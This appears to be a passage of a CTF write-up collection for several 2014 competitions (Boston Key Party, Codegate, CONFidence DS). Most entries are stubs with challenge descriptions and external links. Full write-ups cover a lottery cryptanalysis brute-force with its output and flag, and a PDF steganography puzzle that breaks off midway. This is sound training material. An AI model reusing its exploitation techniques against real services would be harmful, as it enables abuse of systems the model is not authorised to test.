**Description:**

> cheetah...lane...tangle
> Who won it?
> No need for MD5 or `ASIS_`

## Write-up

After looking for those words and 'win' in Google we came up with Wikipedia page (this is the only one that is connected with IT/Security) about [NIST hash function competition](http://en.wikipedia.org/wiki/NIST_hash_function_competition).
The purpose of this cometition was to develop a [SHA-3](http://en.wikipedia.org/wiki/SHA-3) to complement SHA-1 and SHA-2 hashing algorithms.

Cheetah, Lane and Tangle were all entrants to the competition though they did not qualify for the final round. The winner was [Keccak](http://en.wikipedia.org/wiki/Keccak) thus the flag for this challenge is Keccak.

## Other write-ups and resources

* <http://singularityctf.blogspot.de/2014/05/asis-ctf-quals-2014-writeup-winner.html>
# Boston Key Party CTF 2014: Differential Power

**Category:** Crypto
**Points:** 400
**Description:**

> we hooked up a power meter to this encryption box. we don't know the key. that's what we want to know. you can encrypt any string of 8 characters on the service http://54.218.22.41:6969/string_to_encrypt
>
> [http://bostonkeyparty.net/challenges/encrypt.asm-63541b9c26815fc4d16c7933efe5dd41](encrypt.asm-63541b9c26815fc4d16c7933efe5dd41)

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/boston-key-party-ctf-differential-power-crypto-400/>
# Boston Key Party CTF 2014: Door 1

**Category:** Crypto
**Points:** 500
**Description:**

> You need to open door no 5 in a secret facility. We have been trying to brute-force the door without success. One of our agents was able to infiltrate the control room and take a picture. The server is known to use some kind of problematic random number generator for the authentication. Open the door. The service is accessible on 54.186.6.201:8901, good luck with your mission.
>
> [http://bostonkeyparty.net/challenges/door1-2cf3f7c1a85d3a5eb2c922c5426435a3.jpg](door1-2cf3f7c1a85d3a5eb2c922c5426435a3.jpg)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF 2014: Mind your P's and Q's!

**Category:** Crypto
**Points:** 100
**Description:**

> The flag has been split into several files, and encrypted under RSA-OAEP. Can you break ALL of the ciphertexts, and reassemble the key?
>
> [http://bostonkeyparty.net/challenges/challenge-cd6d19866c42e274cd09604adaf4077b.tar.gz](challenge-cd6d19866c42e274cd09604adaf4077b.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF 2014: MITM II: Electric Boogaloo

**Category:** Crypto
**Points:** 200
**Description:**

> Chisa and Arisu are trying to tell each other two halves of a very important secret! They think they're safe, because they know how cryptography works---but can you learn their terrible, terrible secret? They're available as services at 54.186.6.201:12346 and 54.186.6.201:12345 respectively.
>
> [http://bostonkeyparty.net/challenges/mitm2-632e4ecc332baba0943a0c6471dec2c6.tar.bz2](mitm2-632e4ecc332baba0943a0c6471dec2c6.tar.bz2)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/31>
# Boston Key Party CTF 2014: Xorxes the Hash

**Category:** Crypto
**Points:** 200
**Description:**

> Xorxes is a hash collision challenge. The goal is to find a second preimage for the input string "Klaatubaradanikto". Submit it as the flag.
>
> [http://bostonkeyparty.net/challenges/xorxes-ad7b52380d3ec704b28954c80119789a.py](xorxes-ad7b52380d3ec704b28954c80119789a.py)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/29>
# Boston Key Party CTF 2014: Dante's Inferno

**Category:** Other
**Points:** 50
**Description:**

> I am an evil man
>
> [http://bostonkeyparty.net/challenges/divine_comedy-0a7ab7132c24a772d52c124a7a5ee733.txt.torrent](divine_comedy-0a7ab7132c24a772d52c124a7a5ee733.txt.torrent)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/03/boston-key-party-dantes-inferno-write-up.html>
* <http://tasteless.eu/2014/03/boston-key-party-ctf-2014-dantes-inferno/>
# Boston Key Party CTF 2014: Functional High Five RPC Execution System for Remote High Fives

**Category:** Other
**Points:** 200
**Description:**

> you guys really like web, eh?
>
> http://54.218.22.41:4878

## Write-up

(TODO)

## Other write-ups and resources

 <http://tasteless.eu/2014/03/boston-key-party-ctf-2014-web200-writeup/>
# Boston Key Party CTF 2014: Greenmonster

**Category:** Other
**Points:** 250
**Description:**

> Get whitelisted and then connect to port 9999. The Firewall is at 54.186.3.195
>
> [http://bostonkeyparty.net/challenges/greenmonster-4ce5641c9481905267f0a83c5da0266f](greenmonster-4ce5641c9481905267f0a83c5da0266f.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2014/greenmonster/knock.py>
# Boston Key Party CTF 2014: Sketchy

**Category:** Other
**Points:** 125
**Description:**

> see if you can figure out whats going on...
>
> [http://bostonkeyparty.net/challenges/sketchy.pcap](sketchy.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF 2014: Deepblue

**Category:** Pwning
**Points:** 500
**Description:**

> Can you play chess ? 54.213.239.142 8888
>
> [http://bostonkeyparty.net/challenges/deepblue-337848eb3f394204c016331a0e1b3b5a](deepblue-337848eb3f394204c016331a0e1b3b5a) [http://bostonkeyparty.net/challenges/libc.so.6-b14d340ca05368bcecaac69f112f07e1](libc.so.6-b14d340ca05368bcecaac69f112f07e1)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF 2014: Fruits

**Category:** Pwning
**Points:** 100
**Description:**

> Just Pwn it 54.218.22.41:37717 HINT: key is in key.txt HINT: yes, this challenge is 100 points. HINT: really. HINT: Because of a bug, it is being run remotely with: ncat -v -k -l 37717 -e "./fruits-b43fce47212336d695d97c690a9 --local" md5sum of the fruits binary should be e3ea214d636cd3b3a9d22b4404f0ff4d
>
> [http://bostonkeyparty.net/challenges/fruits-b43fce47212336d695d97c690a9ab16f](fruits-b43fce47212336d695d97c690a9ab16f)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2014/fruits/exploit.py>
* [Writeup by @wapiflapi](http://wapiflapi.github.io/2014/04/30/getting-a-shell-on-fruits-bkpctf-2014/)
# Boston Key Party CTF 2014: Jailbreak

**Category:** Pwning
**Points:** 400
**Description:**

> Pwning 54.213.239.142 28468 : 400
>
> Exploit the console.
>
> http://bostonkeyparty.net/challenges/jailbreak-b0175164b087fe9175b222df8f9d6cf6](jailbreak-b0175164b087fe9175b222df8f9d6cf6)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2014/jailbreak/>
# Boston Key Party CTF 2014: Risc\_Emu

**Category:** Pwning
**Points:** 100
**Description:**

> nobody cares about this service nc 54.218.22.41 4545
>
> [http://bostonkeyparty.net/challenges/emu-c7c4671145c5bb6ad48682ec0c58b831](emu-c7c4671145c5bb6ad48682ec0c58b831)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2014/risc_emu/exploit.py>
* <http://blog.0xdeffbeef.com/2014/03/boston-key-party-ctf-2014-riscemu.html>
* [French](http://blog.frizn.fr/bkpctf-2014/pwn-100-risc_emu)
* [Chinese](http://217.logdown.com/posts/183020-boston-key-party-ctf-2014-risc-emu)
# Boston Key Party CTF 2014: Snapstagram(TM)

**Category:** Pwning
**Points:** 350
**Description:**

> there is instagram and snapchat, there is room for one more! nc 54.186.6.201 8888
>
> [http://bostonkeyparty.net/challenges/snapstagram-57385e2174203d66b871e269ef3893df.tar.gz](snapstagram-57385e2174203d66b871e269ef3893df.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2014/snapstagram/>
# Boston Key Party CTF 2014: Zen Garden

**Category:** Pwning
**Points:** 300
**Description:**

> be one with the machine nc 54.218.22.41 4766 hint: tomcr00se is complaining, so we got you a present http://bostonkeyparty.net/challenges/libc.so.6-9c8f19d9b0cf8d3703f76e4d2c95ceb0
>
> [http://bostonkeyparty.net/challenges/zengarden-9b81162aea2ed4be3838faff59b3fd1b](zengarden-9b81162aea2ed4be3838faff59b3fd1b)

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.frizn.fr/bkpctf-2014/pwn-300-zengarden>
# Boston Key Party CTF 2014 write-ups

* <http://bostonkeyparty.net/>
* [Scoreboard](scoreboard.png) or [local alternative](scoreboard.txt)

## Completed write-ups

* none yet

## External write-ups only

* [dantes\_inferno](other/dantes_inferno)
* [decrypt\_img](reversing/decrypt_img)
* [differential\_power](crypto/differential_power)
* [fruits](pwning/fruits)
* [functional\_highfive](other/functional_highfive)
* [greenmonster](other/greenmonster)
* [hypercube](reversing/hypercube)
* [jailbreak](pwning/jailbreak)
* [mitm\_ii](crypto/mitm_ii)
* [r3v3](reversing/r3v3)
* [rarverseme](reversing/rarverseme)
* [risc\_emu](pwning/risc_emu)
* [snapstagram](pwning/snapstagram)
* [xorxes](crypto/xorxes)
* [vm](reversing/vm)
* [zen\_garden](pwning/zen_garden)

## Missing write-ups

* [deepblue](pwning/deepblue)
* [door\_1](crypto/door_1)
* [mind\_your\_ps\_and\_qs](crypto/mind_your_ps_and_qs)
* [sketchy](other/sketchy)
* [xorxes\_return](reversing/xorxes_return)
# Boston Key Party CTF 2014: Decrypt Img

**Category:** Reversing
**Points:** 200
**Description:**

> We encrypted an image that we drew in paint, but lost the original! Can you recover it for us?
>
> [http://bostonkeyparty.net/challenges/decryptimg-a921005aad6a6b6b445d0d754d54a311.zip](decryptimg-a921005aad6a6b6b445d0d754d54a311.zip)

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://217.logdown.com/posts/183027-boston-key-party-ctf-2014-decrypt-img)
* <http://piggybird.net/2014/03/boston-key-party-ctf-2014-reversing-200-decrypt-img/>
# Boston Key Party CTF 2014: Hybercube

**Category:** Reversing
**Points:** 300
**Description:**

> someone wrote a program to compute "C", but its compiled for Hypercube, which we don't have. Can you find "C" with math and computations. http://devkitpro.org/viewtopic.php?f=7&t=2915&view=previous might be of help to you
>
> [http://bostonkeyparty.net/challenges/hypercube-5f456d4afe1cae8909b3ff9abba66c0a.dol](hypercube-5f456d4afe1cae8909b3ff9abba66c0a.dol)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.kizhakkinan.com/?p=168>
* <http://blog.delroth.net/2014/03/boston-key-party-crackme300-hypercube-writeup/>
* <http://piggybird.net/2014/03/boston-key-party-ctf-2014-reversing-200-hypercube/>
# Boston Key Party CTF 2014: R3V3

**Category:** Reversing
**Points:** 250
**Description:**

> reverse this, I'm too tired to come up with a description
>
> [http://bostonkeyparty.net/challenges/R3v3.exe-344b994acc318d220c0acbf3974a2a80.tar.gz](R3v3.exe-344b994acc318d220c0acbf3974a2a80.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://balidani.blogspot.jp/2014/03/boston-key-party-r3v3-writeup.html>
# Boston Key Party CTF 2014: Rarverseme

**Category:** Reversing
**Points:** 350
**Description:**

> reverse this rar! (ITS A PATCHME)(UPDATE: there is some collision in terms of flags apparently. You'll know the right one when you see it) unrar p -inul rarverseme.rar
>
> [http://bostonkeyparty.net/challenges/rarverseme-67da2b0c60e58e47dc38aa36b329b18b.rar](rarverseme-67da2b0c60e58e47dc38aa36b329b18b.rar)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/zachriggle/9302481#file-rarverseme-readme-txt>
* <http://www.kizhakkinan.com/?p=175>
# Boston Key Party CTF 2014: VM

**Category:** Reversing
**Points:** 300
**Description:**

> this vm needs a license to run. we don't have the license!
>
> [http://bostonkeyparty.net/challenges/vm-2fbed3f5a894d56be6b2ba328f9e2411](vm-2fbed3f5a894d56be6b2ba328f9e2411)

## Write-up

(TODO)

## Other write-ups and resources

* <http://piggybird.net/2014/03/boston-key-party-ctf-2014-reversing-300-vm/>
# Boston Key Party CTF 2014: Xorxes Return

**Category:** Reversing
**Points:** 275
**Description:**

> After an unsuccesful career in crypto, xorxes has decided to move into obfuscation instead.
>
> [http://bostonkeyparty.net/challenges/xorxes2-57fa65160198f5e3b16ec6d328d69a8d](xorxes2-57fa65160198f5e3b16ec6d328d69a8d)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Codegate Preliminary CTF 2014: 120

**Category:** Web
**Points:** 500
**Description:**

> You don't have enough arrows...
>
> [Download](120.phps)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.nops.re/2014-02-23-codegate-2014-120.html>
* <http://securetty.standard.io/post/77692636735/codegate-2014-ctf-web-120-write-up>
* <http://pastebin.com/p3HF3X6Y>
* <http://pastie.org/private/s0mul2swzfzgzt6gasqma>
* <https://gist.github.com/xelenonz/99c0a394be62a3b70d92>
* [French](http://kmkz-web-blog.blogspot.fr/2014/02/write-up-120-codegate-web-500.html)
* <http://blog.0xdeffbeef.com/2014/02/codegate-ctf-2014-120-arrows-web-500.html>
* <http://pastebin.com/8f66dt7h>
* <http://blog.dragonsector.pl/2014/02/codegate-ctf-preliminary-2014-web500-120.html>
* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-120-writeup/>
* [Korean](http://tunz.tistory.com/109)
* [Korean](http://pgnsc.tistory.com/342)
# Codegate Preliminary CTF 2014: 4Stone

**Category:** Pwnable
**Points:** 300
**Description:**

> Please enjoy this game
>
> [Download](4stone)

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/7YJXhzwh>
* <https://github.com/maraud3rs/writeups/tree/master/codegate_4stone>
* [Korean](http://blackcon.tistory.com/90)
# Codegate Preliminary CTF 2014: Angry Doraemon

**Category:** Pwnable
**Points:** 250
**Description:**

> You should not have teased Doraemon!
>
> [Download](angry_doraemon_c927b1681064f78612ce78f6b93c14d9)

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/codegate-2014-quals-angry-doraemon-pwn-250/>
* <http://www.nops.re/2014-02-23-codegate-2014-doraemon.html>
* <http://pastebin.com/Y2Z7pvY5>
* <http://pastebin.com/RziZTfJk>
* <http://v0ids3curity.blogspot.jp/2014/02/codegate-ctf-quals-2014-angry-doraemon.html>
* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-angry_doraemon-writeup/>
* [Chinese](http://217.logdown.com/posts/180766-codegate-ctf-preliminary-2014-angry-doraemon-writeup)
* [Korean](http://pgnsc.tistory.com/341)
# Codegate Preliminary CTF 2014: Automata

**Category:** Reversing
**Points:** 400
**Description:**

> Automata look awesome but they feel alone
>
> [Download](automata_7329666edefb3754ec91b7316e61bb7d)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/27>
* <http://rep.github.io/codegate-2014-automata-re400.html>
* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-automata-writeup/>
# Codegate Preliminary CTF 2014: Chrono Logical

**Category:** Logical
**Points:** 300
**Description:**

> E=mc^2
>
> [Download](chrono)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/>
* <http://pastie.org/pastes/8790402>
# Codegate Preliminary CTF 2014: Clone Technique

**Category:** Reversing
**Points:** 250
**Description:**

> Limited processes will be generated. Which one has the flag?
>
> [Download](clone_technique.exe_b9b0870fb1b877cecf5ea2ae615e12eb)

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastie.org/private/u7qhknypk29wgontrfvq>
* <http://www.nops.re/2014-02-23-codegate-2014-clone-technique.html>
* <http://rce4fun.blogspot.jp/2014/02/codegate-ctf-2014-reverse-250-clone.html>
* <http://piggybird.net/2014/02/codegate-ctf-preliminary-2014-clone-technique-writeup/>
* <http://tasteless.eu/2014/02/codegate-ctf-preliminary-2014-clone-technique-writeup/>
* [French](http://adelkhaldi.blogspot.jp/2014/02/codegate-ctf-2014-clone-technique.html)
* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/>
* [Chinese](http://217.logdown.com/posts/180748-codegate-ctf-preliminary-2014-clone-technique-writeup)
* [Korean](http://havu.tistory.com/36)
* [Korean](http://pgnsc.tistory.com/343)
# Codegate Preliminary CTF 2014: dodoCrackme

**Category:** Reversing
**Points:** 200
**Description:**

> My eyes almost poped out!
>
> [Download](crackme_d079a0af0b01789c01d5755c885da4f6)

## Write-up

(TODO)

## Other write-ups and resources

* <http://piggybird.net/2014/02/codegate-ctf-preliminary-2014-re-200-dodocrackme/>
* <http://blog.squareroots.de/en/2014/02/codegate-2014-write-up-dodocrackme/>
* <http://v0ids3curity.blogspot.jp/2014/02/codegate-ctf-quals-2014-dodocrackme.html>
* [French](http://adelkhaldi.blogspot.jp/2014/02/codegate-ctf-2014-dodocrackme-writeup.html)
* [Korean](http://havu.tistory.com/35)
* [Korean](http://pgnsc.tistory.com/344)
* [Japanese](http://wataamectf.blogspot.jp/2014/02/codegate-2014-writeup.html)
* [Japanese](http://emeth.jp/diary/?p=167)
* [Japanese/English](http://www.tanakazakku.com/yamatosecurity/files/codegate2014-dodocrackmewriteup.pdf)
# Codegate Preliminary CTF 2014: dodosandbox

**Category:** Pwnable
**Points:** 600
**Description:**

> You must not escape from here
>
> [Download](dodosandbox_4b755a6734301baa00044297e69e1619)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Codegate Preliminary CTF 2014: Hypercat!

**Category:** Reversing, Pwnable
**Points:** 550
**Description:**

> The cat is crying.
>
> nya-ong~
>
> nya-ong~
>
> [Download](hypercat)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/eggpod/d5e53078809fded1a2a4>
# Codegate Preliminary CTF 2014: Korean Restaurant

**Category:** Pwnable
**Points:** 700
**Description:**

> We all love kimchi jjigae! - DEP (O) - ASLR (X), sysctl -w kernel.randomizevaspace=0
>
> [korean.db\_c4eb35a538b5870e6c752c17a09f429a.txt](korean.db_c4eb35a538b5870e6c752c17a09f429a.txt)
>
> [Download](korean_f1f365e089fe6fcd7d101b4ffad77555)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Codegate Preliminary CTF 2014: Membership

**Category:** Pwnable
**Points:** 800
**Description:**

> Only members can access to here!
>
> [Download](membership)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.bpak.org/blog/2014/02/codegate-2014-membership-800pt-pwnable-write-up/>
* <http://ppp.cylab.cmu.edu/wordpress/?p=1165>
# Codegate Preliminary CTF 2014: Minibomb

**Category:** Pwnable
**Points:** 400
**Description:**

> boom! boom! boom!
>
> [Download](minibomb)

## Write-up

(TODO)

## Other write-ups and resources

* <http://mslc.ctf.su/wp/codegate-2014-quals-minibomb-pwn-400/>
* <http://pastie.org/private/iyxcb3y9odssaq81baivfa>
# Codegate Preliminary CTF 2014 write-ups

* <http://ctf.codegate.org/>
* [Scoreboard](scoreboard.txt)

## Completed write-ups

* none yet

## External write-ups only

* [120](120)
* [4stone](4stone)
* [angrydoraemon](angrydoraemon)
* [automata](automata)
* [chronological](chronological)
* [clonetechnique](clonetechnique)
* [dodocrackme](dodocrackme)
* [hypercat](hypercat)
* [membership](membership)
* [minibomb](minibomb)
* [webproxy](webproxy)
* [weirdshark](weirdshark)
* [weirdsnus](weirdsnus)

## Missing write-ups

* [dodosandbox](dodosandbox)
* [koreanrestaurant](koreanrestaurant)
# Codegate Preliminary CTF 2014: Web Proxy

**Category:** Web
**Points:** 200
**Description:**

> You can surf on the internet safely with our proxy <http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0xdeffbeef.com/2014/02/codegate-ctf-2014-web-proxy-web-200.html>
* <http://tasteless.eu/2014/02/codegate-ctf-preliminary-2014-web-proxy-writeup/>
* [German](https://f00l.de/blog/codegate-ctf-2014-web-proxy/)
* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/>
* [Korean](http://pgnsc.tistory.com/340)
# Codegate Preliminary CTF 2014: WeirdShark

**Category:** Forensic
**Points:** 150
**Description:**

> Shark gets sometimes weird
>
> [Download](weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7)

## Write-up

(TODO)

## Other write-ups and resources

* <http://piggybird.net/2014/02/codegate-ctf-preliminary-2014-forensics-150-weirdshark/>
* <https://shankaraman.wordpress.com/2014/02/24/codegate-2014-quals-forensics-150-weirdshark-writeup/>
* [German](https://f00l.de/blog/codegate-ctf-2014-weirdshark/)
* [Korean](http://pgnsc.tistory.com/344)
* [Korean](http://blog.jinmo123.pe.kr/entry/Codegate-2014-weirdshark-forensic-problem-writeup)
* [japanese](http://blog.5v-gnd.net/archives/1082)
* [Japanese](http://emeth.jp/diary/?p=184)
# Codegate Preliminary CTF 2014: Weird\_snus

**Category:** Reversing, Pwnable
**Points:** 450
**Description:**

> Have you tried Snus? Addiction is good, isn't it?
>
> [Download](weird_snus)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/>
* [Korean](http://blog.jinmo123.pe.kr/entry/Codegate-2014-weirdsnus-writeup)
# CONFidence DS CTF Teaser: Crypto100

**Category:** Crypto
**Points:** 100
**Description:**

> We’ve created a lotto system. Shall we play a game?
>
> ```bash
> nc 23.253.207.179 10001
> ```
> Use the [source](lotto.py)

## Write-up

The lottery is [a Python script](lotto.py) that uses [pycrypto](https://pypi.python.org/pypi/pycrypto/2.6.1), so run `easy_install pycrypto` if you want to run it locally.

Let’s connect to the online service and see how it works:

```bash
$ nc 23.253.207.179 10001
###############################################################################
#                                                                             #
# Welcome to our Lotto!                                                       #
# Bid for $5, win $100!                                                       #
# Our system is provably fair:                                                #
#    Before each bid you'll receive encrypted result                          #
#    After the whole game we will reveal the key to you                       #
#    Then, you can decrypt results and verify that we haven't cheated on you! #
#     (e.g. by drawing based on your input)                                   #
#                                                                             #
###############################################################################

Your money: $100
Round verification: 18167373f0918114f833cdbc184202bf

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
1
Your guess (0-1000): 42
You lost!
The lucky number was: 182
[enter] to continue...

Your money: $95
Round verification: 30b15b44ce3cbfb2b936538c36e41bc5

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
2
You cannot withdraw your money until you get $1337!
The lucky number was: 292
[enter] to continue...

Your money: $95
Round verification: 1e3f942dfd3f5718789e14ebf570eae7

Your choice:
        1. Buy a coupon for $5
        2. Withdraw your money
        3. Quit
3
The lucky number was: 342
Verification key: 5e230c5a1f2b766309ec28bf2eff01d8
```

Cross-referencing this with the source code, it becomes clear there these are the three options for each round:

1. Bet $5. If you guess [the number from `0` to `1000`](lotto.py#L57) correctly, you win $100 (i.e. a profit of $95).
2. Withdraw your money. This [displays the flag if you have $1337 or more, and fails otherwise](lotto.py#L85-89). Either way it also [reveals the lucky number](lotto.py#L96) that you were supposed to guess.
3. Quit the game.

Looking more closely, we learn that the lottery uses the same AES encryption key for each round in the same connection/session:

```py
key = Random.new().read(16) # slow, but secure
aes = AES.new(key, AES.MODE_ECB)
```

However, each lucky number is concatenated with a random salt before it’s encrypted into the so-called “round verification hash”:

```
salted = str(luckyNumber) + '#'
salted = randomExtend(salted)
```

For example, if `luckyNumber` is `84`, then `randomExtend(str(luckyNumber) + '#')` is something like `84#00059d2a12d51`. After patching `lotto.py` to log the salted lucky number for each round, it became clear that all salts started with two zeroes:

```
247#000000000000
84#00059d2a12d51
255#00beca8fe000
364#00ddf93a9d91
538#00552d9ca771
743#003fbc1cb5c9
…
```

Yep, that first one even has only zeroes! This seemed to happen quite commonly; about 10% of all salts ended in `000000000000`. Looks like `randomExtend` isn’t as random as it should be :) (Explanation: any number with a `0` as the last digit (i.e. 10% of numbers) [raised to a high power](lotto.py#L30-38) will have a bunch of zeroes at the end.)

This flaw enables us to write a fairly simple brute-force solution with the following algorithm:

1. Connect to the lottery service.
2. For each round, make a note of the round verification hash. If the round verification hash has been used before, bet $5 on the lucky number it mapped to before; this gets you $95. If not, choose “Withdraw your money”, which shows you the lucky number for this round — remember that the given round verification hash mapped to this lucky number.
3. If you keep repeating this long enough, at some point you’ll have $1430. Now you can choose “Withdraw your money” to get the flag.

[`brute-force-solution.py`](brute-force-solution.py) is a Python implementation of this solution. It took the script about 25 minutes to make enough money to get the flag:

```bash
$ python brute-force-solution.py
Round #1 | Money: $100 | Round verification: 496be14c66a5aac6af1fd841f26102f4
Lucky number: 229
Round #2 | Money: $100 | Round verification: 86244b7964db766497590d826db87c8e
Lucky number: 873
Round #3 | Money: $100 | Round verification: 4f535ef3d98a142cee40ecf6d34a4334
Lucky number: 994
Round #4 | Money: $100 | Round verification: 02996452c102ef13939680754257460f
Lucky number: 178
Round #5 | Money: $100 | Round verification: 88f71ecb1561208166ec112cb6bc13c3
Lucky number: 217
Round #6 | Money: $100 | Round verification: 80510634961a4c985d07ff089b520310
Lucky number: 778
Round #7 | Money: $100 | Round verification: b5475dea706c3c7285568d68092c5a06
Lucky number: 610
Round #8 | Money: $100 | Round verification: a3e0645d43ac069fbc322d5cdbf692bf

[…]

Round #219 | Money: $100 | Round verification: 3d3955b4fee673bbffed2760b7e5f537
You won $100!
The lucky number was: 389
[enter] to continue...

Round #220 | Money: $195 | Round verification: 81aa91772881d915a951e72270f39291
Lucky number: 627
Round #221 | Money: $195 | Round verification: 71d8b1bba071056e5aa510e9b6dbe35d
Lucky number: 743
Round #222 | Money: $195 | Round verification: dfab6036861640d59479444df681ca9e
Lucky number: 165
Round #223 | Money: $195 | Round verification: 0cda534713cbfd4aa218bf2648b879d5
Lucky number: 183
Round #224 | Money: $195 | Round verification: 880091b15457a0a9c0922b9233bbbc52
You won $100!
The lucky number was: 1000
[enter] to continue...

Round #225 | Money: $290 | Round verification: 07f9716235a394eddf246f46ff814280
Lucky number: 245

[…]

Round #1684 | Money: $1335 | Round verification: 54a9309da2f4f6e26b40a6439ae209cf
You won $100!
The lucky number was: 128
[enter] to continue...

Round #1685 | Money: $1430 | Round verification: bcd4bd9ac16e16fe83d76b1831f7da2e
You won! Here's your reward: DSCTF_939da0eec884d9edddbe97b9f9e348dede7211d821a1b56069816d7bad6c0f2e

The lucky number was: 953
[enter] to continue...
```

The flag is `DSCTF_939da0eec884d9edddbe97b9f9e348dede7211d821a1b56069816d7bad6c0f2e`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/04/27/dragonsector-crypto-100/>
* <http://blog.dul.ac/2014/04/DSCTF14/>
# CONFidence DS CTF Teaser: Pwnable200

**Category:** Pwn
**Points:** 200
**Description:**

> Service at 23.253.207.179:10002 is running this [binary](pwn200) - pwn it!
> **Update:** New binary on 04/26 10:20: md5 is `2b98a1c9781098fbd5d3c6a69719963c`
> 10:23:38 <@Gynvael> ANNOUNCEMENT: pwn200 binary is now re-uploaded (sorry, we uploaded the wrong binary previously; the change is really small though)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by Daniel Bali](http://balidani.blogspot.com/2014/04/confidence-ds-ctf-pwn200-writeup.html)
* [Solution by Daniel Bali](https://gist.github.com/balidani/ab8429bc7b59af7bed8c)
* [Solution by mak`](http://lokalhost.pl/x/pwn200.py)
* [Solution by Gynvael Coldwind](https://gist.github.com/anonymous/53e6811a7c9e6f8bcf4f)
* [Solution by Bartol](https://gist.github.com/Bartol0/283564a864e270b554ef)
# CONFidence DS CTF Teaser

* [Main website](https://ctf.dragonsector.pl/)
* [Scoreboard](https://ctf.dragonsector.pl/?scoreboard)
* [@DragonSectorCTF on Twitter](https://twitter.com/DragonSectorCTF)

## Completed write-ups

* [Stegano50](stegano50)
* [Crypto100](crypto100)

## External write-ups only

* [Pwnable200](pwnable200)
* [Web400](web400)

## Incomplete write-ups

* [Reverse300](reverse300)
# CONFidence DS CTF Teaser: Reverse300

**Category:** Reverse-engineering
**Points:** 300
**Description:**

> Run this [binary](re300) with the same username you are logged in with. Once you find a valid password and token, enter it below:
>
> Username: `[_]`
> Password: `[_]`
> Token: `[_]`
>
> **Update 04/26 16:15 CEST:** New binary - md5 is `cd1eb7ced07cc6f872537d0618630c0c` - new strings, but offsets stayed the same.
>
> **Update 04/26 21:33 CEST:**
> The allowed charset for password and token is `A-Za-z0-9`. Players with whitespaces in the name - please remove the w hitespaces in the solution, as shown below.
>
> **Hint 04/26 21:33 CEST:**
> Don’t lose your way in the SERPENTines.
>
> **Hint 04/27 15:00 CEST:**
> There seem to be different kinds of serpents out there - but you already have the right one, don’t you?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CONFidence DS CTF Teaser: Stegano50

**Category:** Stegano
**Points:** 50
**Description:**

> Find the hidden message in this [file](stegano50.pdf)

## Write-up

We’re provided with [a PDF file](stegano50.pdf) that mostly contains some _lorem ipsum_ filler text. The document has a watermark saying “No Flag Here!” and also contains this teaser:

> In facilisis et tortor commodo aliquam[ Your flag is not here ]olestie bibendum, leo nisi porttitor massa, id accumsan sapien libero id tellus.

Let’s take a look at the PDF’s meta data.

```bash
$ pdfinfo stegano50.pdf
Title:          polar bear during a snow storm
Subject:        <| tr AB .- |>
Keywords:       Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==
Author:         KeiDii
Creator:        LaTeX /o/
Producer:       find mr.morse text
CreationDate:   Thu Mar 13 22:33:50 2014
ModDate:        Thu Mar 13 22:33:50 2014
Tagged:         no
Form:           none
Pages:          1
Encrypted:      no
Page size:      595.276 x 841.89 pts (A4)
File size:      38742 bytes
Optimized:      no
PDF version:    1.5
```

The ‘keywords’ section seems interesting. Let’s base64-decode `Tm9wZSAsIG5vdCBoZXJlIDspCg==`:

```
$ base64 --decode <<< 'Tm9wZSAsIG5vdCBoZXJlIDspCg=='
Nope , not here ;)
```

That would’ve been too easy! Moving on, the ‘title’ and ‘producer’ fields seem to hint that Morse code is somehow involved. The ‘subject’ field looks like an example of using [the `tr` command](http://unixhelp.ed.ac.uk/CGI/man-cgi?tr): `tr AB .-` means “replace all instances of `A` with `.` and all instances of `B` with `-`”.

